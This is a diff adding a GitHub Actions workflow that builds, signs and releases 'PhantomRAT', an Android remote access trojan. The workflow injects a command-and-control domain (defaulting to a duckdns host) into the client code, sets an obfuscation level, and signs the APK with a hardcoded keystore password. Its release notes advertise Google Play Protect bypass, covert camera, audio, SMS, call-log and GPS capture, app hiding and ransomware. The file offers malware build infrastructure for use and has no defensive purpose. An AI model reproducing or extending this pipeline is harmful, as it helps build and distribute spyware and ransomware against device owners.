@@ -1,0 +1,117 @@
+name: 🧬 PhantomRAT Build & Release
+
+on:
+  push:
+    branches: [ "main", "master" ]
+  pull_request:
+    branches: [ "main", "master" ]
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Version tag'
+        required: false
+        default: '1.0.0'
+      c2_domain:
+        description: 'C2 Domain/ID (not IP)'
+        required: true
+        default: 'phantom-c2.duckdns.org'
+      obfuscation_level:
+        description: 'Obfuscation level (low/medium/high)'
+        required: true
+        default: 'high'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: ⬇️ Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: ☕ Setup JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+
+      - name: 🐍 Setup Python 3.10
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+
+      - name: 📦 Install Dependencies
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq zip unzip wget curl jq openssl
+          pip install --quiet pycryptodome colorama requests
+
+      - name: 🔐 Inject C2 Configuration
+        run: |
+          # Replace C2 domain/ID placeholder with real value
+          sed -i "s/C2_DOMAIN_PLACEHOLDER/${{ github.event.inputs.c2_domain }}/g" \
+            app/src/main/java/com/phantom/rat/core/C2Client.kt
+          
+          # Generate unique device fingerprint seed
+          echo "package com.phantom.rat.core" > app/src/main/java/com/phantom/rat/core/Fingerprint.kt
+          echo "object Fingerprint {" >> app/src/main/java/com/phantom/rat/core/Fingerprint.kt
+          echo "    const val SEED = \"$(openssl rand -hex 32)\"" >> app/src/main/java/com/phantom/rat/core/Fingerprint.kt
+          echo "    const val SALT = \"$(openssl rand -hex 16)\"" >> app/src/main/java/com/phantom/rat/core/Fingerprint.kt
+          echo "}" >> app/src/main/java/com/phantom/rat/core/Fingerprint.kt
+
+      - name: 🔨 Build APK with R8/ProGuard
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleRelease --no-daemon
+
+      - name: 🔑 Sign APK
+        run: |
+          # Generate keystore for signing
+          keytool -genkey -v -keystore phantom.keystore \
+            -alias phantom -keyalg RSA -keysize 2048 \
+            -validity 10000 -storepass phantom123 \
+            -keypass phantom123 -dname "CN=Phantom, OU=Security, O=PhantomRAT, L=Unknown, ST=Unknown, C=XX"
+          
+          # Sign the APK
+          jarsigner -verbose -sigalg SHA1withRSA \
+            -digestalg SHA1 -keystore phantom.keystore \
+            -storepass phantom123 -keypass phantom123 \
+            app/build/outputs/apk/release/app-release-unsigned.apk phantom
+          
+          # Align and finalize
+          ${ANDROID_HOME}/build-tools/34.0.0/zipalign -v -p 4 \
+            app/build/outputs/apk/release/app-release-unsigned.apk \
+            PhantomRAT-v${{ github.event.inputs.version }}.apk
+
+      - name: 📤 Upload APK Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: PhantomRAT-v${{ github.event.inputs.version }}
+          path: PhantomRAT-v${{ github.event.inputs.version }}.apk
+
+      - name: 🏷️ Create Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: v${{ github.event.inputs.version }}
+          name: "PhantomRAT v${{ github.event.inputs.version }}"
+          body: |
+            # 🧬 PhantomRAT v${{ github.event.inputs.version }}
+            
+            ## 📋 Features
+            - 🚀 Payload generation for Android/Windows/Linux/Mac
+            - 🔗 ID-based C2 (no IP tracking)
+            - 📱 Full device control
+            - 🔐 AES-256 encrypted communication
+            - 🛡️ Google Play Protect bypass
+            - 🎯 GPS precise location
+            - 📸 Camera (front/back) streaming
+            - 🎤 Audio recording
+            - 💬 SMS access (sent/received)
+            - 📞 Call logs & recording
+            - 🔓 Ransomware with decryptor
+            - 📁 File download/upload
+            - 🕳️ App hiding
+            - 📡 Live screen streaming
+            
+            ## 🎯 C2: ${{ github.event.inputs.c2_domain }}
+          files: |
+            PhantomRAT-v${{ github.event.inputs.version }}.apk
